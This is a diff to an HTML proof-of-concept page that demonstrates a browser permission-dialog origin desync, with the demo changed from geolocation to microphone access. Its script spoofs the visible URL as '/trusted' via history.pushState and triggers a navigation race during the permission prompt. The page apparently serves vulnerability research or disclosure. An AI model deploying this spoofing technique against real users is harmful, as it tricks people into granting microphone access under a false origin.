@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Geolocation Origin Desync PoC</title>
+<title>Microphone Origin Desync PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -47,11 +47,11 @@ button {
 </div>
 
 <div id="panel">
-  <h2>Request Location</h2>
-  <p>Tap the button below to request Geolocation permission.</p>
+  <h2>Request Microphone</h2>
+  <p>Tap the button below to request Microphone permission.</p>
 
-  <button onclick="getLocation()">Get Location</button>
-  <p id="output">Location: -</p>
+  <button onclick="getMic()">Get Microphone</button>
+  <p id="output">Microphone: -</p>
 
   <div class="notice">
     Demo only — observe origin shown in permission dialog
@@ -63,23 +63,19 @@ const panel   = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
 const output  = document.getElementById('output');
 
-function getLocation() {
-  if (!navigator.geolocation) return;
-
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      output.textContent =
-        `${pos.coords.latitude}, ${pos.coords.longitude}`;
-    },
-    () => {
-      output.textContent = 'Permission denied';
-    }
-  );
+async function getMic() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    output.textContent = 'Microphone access granted';
+    stream.getTracks().forEach(t => t.stop());
+  } catch (e) {
+    output.textContent = 'Permission denied';
+  }
 }
 
 /*
  * Step 1:
- * Manipulate visible URL to a trusted-looking path
+ * Make URL look trusted
  */
 trigger.onclick = () => {
   history.pushState({}, '', '/trusted');
@@ -88,7 +84,7 @@ trigger.onclick = () => {
 
 /*
  * Step 2:
- * Trigger a navigation race shortly after permission flow starts
+ * Navigation race after permission flow starts
  */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
